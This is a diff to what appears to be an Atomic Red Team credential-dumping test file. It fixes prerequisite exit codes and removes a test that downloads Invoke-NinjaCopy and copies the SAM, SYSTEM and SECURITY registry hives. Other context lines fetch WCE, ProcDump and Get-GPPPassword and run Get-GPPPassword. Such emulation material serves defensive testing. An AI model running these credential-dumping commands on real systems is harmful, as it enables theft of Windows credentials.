@@ -36,7 +36,7 @@ atomic_tests:
     - description: |
         Windows Credential Editor must exist on disk at specified location (#{gsecdump_exe})
       prereq_command: |
-        if (Test-Path #{gsecdump_exe}) {0} else {1}
+        if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
       get_prereq_command: |
         Write-Host Automated installer not implemented yet
 
@@ -75,7 +75,7 @@ atomic_tests:
     - description: |
         Windows Credential Editor must exist on disk at specified location (#{wce_exe})
       prereq_command: |
-        if (Test-Path #{wce_exe}) {0} else {1}
+        if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
       get_prereq_command: |
         $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
         if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
@@ -131,7 +131,7 @@ atomic_tests:
     - description: |
         ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
       prereq_command: |
-        if (Test-Path #{procdump_exe}) {0} else {1}
+        if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
       get_prereq_command: |
         Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
         Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
@@ -308,7 +308,7 @@ atomic_tests:
     - description: |
         Computer must be domain joined
       prereq_command: |
-        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {0} else {1}
+        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
       get_prereq_command: |
         Write-Host Joining this computer to a domain must be done manually
 
@@ -340,14 +340,14 @@ atomic_tests:
     - description: |
         Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
       prereq_command: |
-        if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
+        if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 }
       get_prereq_command: |
         New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
         Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
     - description: |
         Computer must be domain joined
       prereq_command: |
-        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {0} else {1}
+        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
       get_prereq_command: |
         Write-Host Joining this computer to a domain must be done manually
 
@@ -357,51 +357,6 @@ atomic_tests:
     command: |
       . #{gpp_script_path}
       Get-GPPPassword -Verbose
-
-- name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
-  description: |
-    This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
-    Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    ninjacopy_script_path:
-      description: Path to the Invoke-NinjaCopy PowerShell script
-      type: Path
-      default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
-    ninjacopy_script_url:
-      description: URL of the Invoke-NinjaCopy PowerShell Script
-      type: url
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
-    output_folder:
-      description: Output folder path
-      type: Path
-      default: C:\Windows\Temp
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: |
-        Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}
-      prereq_command: |
-        if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
-      get_prereq_command: |
-        New-Item -ItemType Directory (Split-Path "#{ninjacopy_script_path}") -Force | Out-Null
-        Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
-
-  executor:
-    name: powershell
-    elevation_required: true
-    command: |
-      . #{ninjacopy_script_path}
-      Invoke-NinjaCopy -Path "%systemroot%\System32\sam" -LocalDestination "#{output_folder}\sam"
-      Invoke-NinjaCopy -Path "%systemroot%\System32\system" -LocalDestination "#{output_folder}\system"
-      Invoke-NinjaCopy -Path "%systemroot%\System32\security" -LocalDestination "#{output_folder}\security"
-    cleanup_command: |
-      del "#{output_folder}\sam" >nul 2> nul
-      del "#{output_folder}\system" >nul 2> nul
-      del "#{output_folder}\security" >nul 2> nul
 
 - name: LSASS read with pypykatz
   description: |
